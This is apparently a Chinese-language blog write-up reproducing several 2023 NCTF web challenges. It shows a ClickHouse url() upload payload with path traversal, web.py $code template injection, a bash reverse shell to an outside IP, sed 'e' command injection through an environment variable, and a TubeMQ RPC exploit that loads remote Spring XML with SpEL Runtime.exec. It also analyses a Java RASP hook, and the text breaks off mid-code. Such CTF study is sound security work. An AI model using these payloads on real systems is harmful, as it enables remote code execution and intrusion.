<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>beb84db6e9c :) <span class="keyword">select</span> <span class="string">&#x27;hello\nwrold&#x27;</span> FORMAT TabSeparated</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;hello\nwrold&#x27;</span></span><br><span class="line">FORMAT TabSeparated</span><br><span class="line"></span><br><span class="line">Query id: <span class="number">8</span>cb146ed<span class="operator">-</span>c53c<span class="number">-4e3</span>f<span class="operator">-</span>a046<span class="operator">-</span>fafeb6a81fb3</span><br><span class="line"></span><br><span class="line">hello\nwrold</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> set. Elapsed: <span class="number">0.001</span> sec.</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>beb84db6e9c :) <span class="keyword">select</span> <span class="string">&#x27;hello\nwrold&#x27;</span> FORMAT TabSeparatedRaw</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;hello\nwrold&#x27;</span></span><br><span class="line">FORMAT TabSeparatedRaw</span><br><span class="line"></span><br><span class="line">Query id: <span class="number">52</span>f51cd8<span class="number">-7528</span><span class="number">-428</span>f<span class="operator">-</span>ae4c<span class="number">-68</span>b34c8bb0fa</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">wrold</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> set. Elapsed: <span class="number">0.001</span> sec. </span><br></pre></td></tr></table></figure>

<p>最后payload就是下面这个</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">FUNCTION</span> url(<span class="string">&#x27;http://172.30.0.3:8001/api/upload&#x27;</span>, <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>,headers(<span class="string">&#x27;X-Access-Token&#x27;</span><span class="operator">=</span><span class="string">&#x27;cbed5f0c829320a82e5d5f4713b02425&#x27;</span>,<span class="string">&#x27;Content-Type&#x27;</span><span class="operator">=</span><span class="string">&#x27;multipart/form-data;boundary=----WebKitFormBoundarytxS8SovqVYBwwSzG&#x27;</span>)) <span class="keyword">VALUES</span> (<span class="string">&#x27;------WebKitFormBoundarytxS8SovqVYBwwSzG\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;ban.txt&quot;\r\nContent-Type: text/plain\r\n\r\nthis is a test\r\n------WebKitFormBoundarytxS8SovqVYBwwSzG--&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>试了一下，发现filename能目录穿越，那么现在我们可以上传任意文件了，再看看源码如何利用它，重新回到我们任意文件读取的那段代码，回到它原本的用处，渲染页面。之前写过jinjia2的ssti，那么先本地试试web.py能否和flask一样进行ssti注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">render = web.template.render(<span class="string">&#x27;templates/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Index</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> render.index()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self</span>):</span><br><span class="line">        data = web.<span class="built_in">input</span>(name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render.__getattr__(data.name)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先搭建一个类似的服务，查阅<a target="_blank" rel="noopener" href="https://webpy.org/docs/0.3/templetor#introduction">web.py文档</a>，文档写到<code>$&#123;&#125;</code>将会解析其中的内容，于是我写了下面的html，并且成功解析了2，那么接下来就简单了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;Index&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">render = web.template.render(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Index</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> render.__getattr__(<span class="string">&#x27;index&#x27;</span>)()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app = web.application(urls, <span class="built_in">globals</span>()) </span><br><span class="line">   app.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    $&#123;1+1&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是当我尝试解析<code>$&#123;().__class__&#125;</code>时，出现了如下错误，貌似有官方有安全防护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    raise SecurityError(&quot;\n&quot;.join([str(err) for err in self.errors]))</span><br><span class="line">web.template.SecurityError: templates/test.html:6 - access to attribute &#x27;__class__&#x27; is denied</span><br></pre></td></tr></table></figure>

<p>继续查看文档，发现了<code>$code</code>变量，似乎任意代码都能在里面执行，虽然有一定的限制但是发现<code>$code:__import__(&#39;os&#39;).system(&#39;calc&#39;)</code>这个payload可以正常执行</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/webtemp.jpg" class="">

<p>下面我们尝试<code>$code:__import__(&#39;os&#39;).system(&#39;/readflag&#39;)</code>，为了执行readflag这里选择反弹shell，<code>$code:__import__(\&#39;os\&#39;).system(\&#39;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.134.147.85/80 0&gt;&amp;1&quot;\&#39;)</code>，现在我们getshell，看到readflag权限<code>-rwsr-xr-x   1 root root 1936768 Dec 24 14:20 readflag</code>,查阅<a target="_blank" rel="noopener" href="https://aiops.com/news/post/5439.html">s权限</a>，user组含有s权限，那么程序将以用户所有者的权限运行，于是我们就能直接运行readflag</p>
<h2 id="3-webshellgenerator"><a href="#3-webshellgenerator" class="headerlink" title="3.webshellgenerator"></a>3.webshellgenerator</h2><p>在<strong>index.php</strong>中我们能够控制<strong>key</strong>和<strong>method</strong>，它们的值将被传递到系统环境变量<code>$KEY</code>和<code>$METHOD</code>，然后会执行以下sh脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>到这里第一个想到的是能否进行<strong>sh脚本注入</strong>，通过控制<strong>key</strong>和<strong>method</strong>来闭合sed命令的<code>&quot;</code>，于是我做了这样的测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh test.sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;something<span class="variable">$KEY</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>我尝试GET传入<code>?1=1&quot;;sleep+5%23</code>和<code>?1=\</code>，它的返回结果如下，无论是闭合操作还是<code>\</code>转义，都无法奏效，引号似乎无法从<code>$KEY</code>里面逃逸出来，sh注入失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string(21) &quot;something1&quot;;sleep 5#</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">string(11) &quot;something\</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>

<p>那么现在可疑的地方就是<strong>sed</strong>，查阅文档我们先看看<code>-i</code>参数的作用<br>新建一个<code>sed.txt</code>其内容为<code>abcdefg</code>，当有<code>-i</code>参数时，修改后的内容将不会输出到终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/docker/webshellgenerator]</span><br><span class="line">└─# sed &quot;s/a/b/&quot; sed.txt                                                                                                1 ⨯</span><br><span class="line">bbcdefg</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/docker/webshellgenerator]</span><br><span class="line">└─# sed -i &quot;s/a/b/&quot; sed.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面我们再了解一下<code>s/KEY/$KEY/g</code>第一个参数的匹配机制，第二个参数文档中说是<code>script</code>，查阅有关<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-scripts">srcipt</a>部分，于是我们有两个个重要的发现:</p>
<blockquote>
<ol>
<li>script中如果存在e标识符，那么e后面以空格分开的部分将被视作shell command执行，结果输出到终端</li>
<li>script中支持<code>;</code>执行多个脚本</li>
</ol>
</blockquote>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sede.jpg" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sedsep.jpg" class="">

<p>于是我做了如下测试,发现确实如上执行多脚本，多命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/docker/webshellgenerator]</span><br><span class="line">└─<span class="comment"># cat sed.txt             </span></span><br><span class="line">abcdefg</span><br><span class="line">                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/docker/webshellgenerator]</span><br><span class="line">└─<span class="comment"># sed -i &quot;s/a/b/; e echo 1111111111&quot; sed.txt</span></span><br><span class="line">                                                        </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/docker/webshellgenerator]</span><br><span class="line">└─<span class="comment"># cat sed.txt                               </span></span><br><span class="line">1111111111</span><br><span class="line">bbcdefg</span><br></pre></td></tr></table></figure>

<p>现在尝试以下的<strong>poc</strong><code>key=1/;e sleep 5; s/KEY/1</code>，拼接进sed就是<code>sed -i &quot;s/KEY/1/;e sleep 5; s/KEY/1/g&quot; &quot;$NEW_FILENAME&quot;</code>，我们成功制造了5017ms的延迟，说明poc奏效</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sedpoc.jpg" class="">

<p>最后的payload,<code>key=1/;e /readflag; s/KEY/1</code>，发包后flag值就会被写入webshell中直接读取即可</p>
<h2 id="4-EvilMQ"><a href="#4-EvilMQ" class="headerlink" title="4.EvilMQ"></a>4.EvilMQ</h2><p>先把<a target="_blank" rel="noopener" href="https://github.com/apache/inlong/tree/master">tubemqdown</a>下来，参考<a target="_blank" rel="noopener" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">ActiveMQ</a>，题目又说与这个CVE类似，所以我们全局搜索Throwable，有很多，所以还需要进一步筛选</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/throwable1.png" class="">

<p>我们回到题目<code>EvilMQ.jar</code>，对关键的<code>ProducerService</code>类和<code>ConsumerService</code>类，进行包溯源。在这两个类中，我们能发现这样一条几乎一直的调用链，所以这tubemq应该和corerpc.netty有很大的关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.example.evilmq.service.ProducerService</span><br><span class="line"></span><br><span class="line">org.apache.inlong.tubemq.client.factory.TubeSingleSessionFactory</span><br><span class="line"></span><br><span class="line">org.apache.inlong.tubemq.corerpc.netty.NettyClientFactory</span><br></pre></td></tr></table></figure>

<p>结合上面的全局查找，我们选出了下面的结果</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/throable2.png" class="">

<p>下面看看client端的分析，在<code>channelRead</code>方法中的<code>MixUtils.unwrapException</code>会从service获取错误和栈追踪，并和<code>#</code>拼接成字符串传入该方法，跟进这一处</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/clientThr.png" class="">

<p>这个方法主要会对，刚刚传入的字符串依据<code>#</code>切片成一个字符串数组，当数组的0,1键值都不为null时，会以0号键值作为类名，1号键值作为字符串传入类中<br>所以这里会想到用spring的ClassPathXmlApplicationContext方法，加载恶意的xml文件</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/wrapunit.png" class="">

<p>spring的ClassPathXmlApplicationContext可以执行命令，参考<a target="_blank" rel="noopener" href="https://www.javaboy.org/2019/0801/spring-xml.html">spring bean</a>和<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">SpEL</a>，下面本地测试一下，虽然会因为类型转化报错，但是还是执行成功了，然后试了远程获取xml也是可以的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        ClassPathXmlApplicationContext classPathXmlApplicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;test.xml&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/calc.png" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/remote.jpg" class="">

<p>那么现在我们看看创建一个恶意server返回我们需要的内容，刚刚全局搜索Trowable的时候我们也注意到了有NettyRpcServer这个类。和client端一样，我们看看<code>channelRead</code>方法，发现了和<code>MixUtils.unwrapException</code>传入字符串处几乎相似的操作，只要<code>try</code>发生错误，就会执行里面的<code>prepareResponse</code>函数，所以我们可以把try的其他内容注释掉，单独抛出一个错误，并把<code>prepareResponse</code>另外两个字符串替换成我们需要的内容即可。</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/evilser.png" class="">

<p>下面开始修改恶意服务的返回类，开启服务，然后client访问consumer，poc执行成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Throwable</span>(<span class="string">&quot;daem0nu&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable ee) &#123;</span><br><span class="line">    List&lt;ByteBuffer&gt; res =</span><br><span class="line">            prepareResponse(<span class="literal">null</span>, rmtVersion, RPCProtos.ResponseHeader.Status.FATAL,</span><br><span class="line">                    <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>, <span class="string">&quot;http://10.0.0.127:9090/test.xml&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">        dataPack.setDataLst(res);</span><br><span class="line">        ctx.channel().writeAndFlush(dataPack);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>#&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/poc.jpg" class="">

<p>然后还有一个unixprocess的rasp，参考这里的<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/49044">5HookNative</a>，题目的<code>com.simplerasp</code>的<code>premain</code>执行后从<code>com.simplerasp.handler</code>获取<code>RaspHandler</code>，也就是<code>java.lang.UNIXProcess</code>，并在其中新增一个动态解析的native方法<code>RASP_forkAndExec</code>，通过<a target="_blank" rel="noopener" href="https://arthas.aliyun.com/doc/sm.html#%E4%BD%BF%E7%94%A8%E5%8F%82%E8%80%83">asthas的sm查看</a></p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/hook.png" class="">

<p>我们本地编译一个<code>test.jar</code>，测试代码如下，我们用<code>SiampleRasp.jar</code>对<code>test.jar</code>hook之后，再远程调试一下，看看Rasp是如何hook和检测到恶意方法的执行的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">            InputStream inputStream=Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">            InputStreamReader inputStreamReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            BufferedReader bufferedReader=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">            String s=bufferedReader.readLine();</span><br><span class="line">            System.out.println(s);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;EVIL!!!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">600000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试发现关键代码在<code>com.simplerasp.transformer.BaseTransformer</code>的<code>transform</code>方法，它遍历所运行jar当中所有调用，如果匹配到<code>java/lang/UNIXProcess</code>则进入<code>try</code>，一开始是调用<code>com.simplerasp</code>的<code>premain</code>来hook<code>java.lang.UNIXProcess</code>，调试过程如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String _className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.className.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>).equals(_className)) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Found target class: &quot;</span> + <span class="built_in">this</span>.className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="built_in">this</span>.className);</span><br><span class="line">            CtClass[] ctParameterTypes = <span class="keyword">new</span> <span class="title class_">CtClass</span>[<span class="built_in">this</span>.parameterTypes.length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.parameterTypes.length; ++i) &#123;</span><br><span class="line">                ctParameterTypes[i] = pool.get(<span class="built_in">this</span>.parameterTypes[i].getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isConstructor) &#123;</span><br><span class="line">                <span class="type">CtBehavior</span> <span class="variable">ctBehavior</span> <span class="operator">=</span> ctClass.getDeclaredConstructor(ctParameterTypes);</span><br><span class="line">                <span class="built_in">this</span>.raspTransform(ctClass, ctBehavior);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">CtBehavior</span> <span class="variable">ctBehavior</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="built_in">this</span>.methodName, ctParameterTypes);</span><br><span class="line">                <span class="keyword">if</span> (Modifier.isNative(ctBehavior.getModifiers())) &#123;</span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> (CtMethod)ctBehavior;</span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">renameCtNativeMethod</span> <span class="operator">=</span> CtNewMethod.copy(ctMethod, ctClass, (ClassMap)<span class="literal">null</span>);</span><br><span class="line">                    renameCtNativeMethod.setName(<span class="string">&quot;RASP_&quot;</span> + ctMethod.getName());</span><br><span class="line">                    ctClass.removeMethod(ctMethod);</span><br><span class="line">                    ctClass.addMethod(renameCtNativeMethod);</span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">hookCtNativeMethod</span> <span class="operator">=</span> CtNewMethod.copy(ctMethod, ctClass, (ClassMap)<span class="literal">null</span>);</span><br><span class="line">                    hookCtNativeMethod.setModifiers(ctMethod.getModifiers() &amp; -<span class="number">257</span>);</span><br><span class="line">                    hookCtNativeMethod.setBody(<span class="string">&quot;&#123; return &quot;</span> + renameCtNativeMethod.getName() + <span class="string">&quot;($$); &#125;&quot;</span>);</span><br><span class="line">                    ctClass.addMethod(hookCtNativeMethod);</span><br><span class="line">                    <span class="built_in">this</span>.raspTransform(ctClass, hookCtNativeMethod);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span 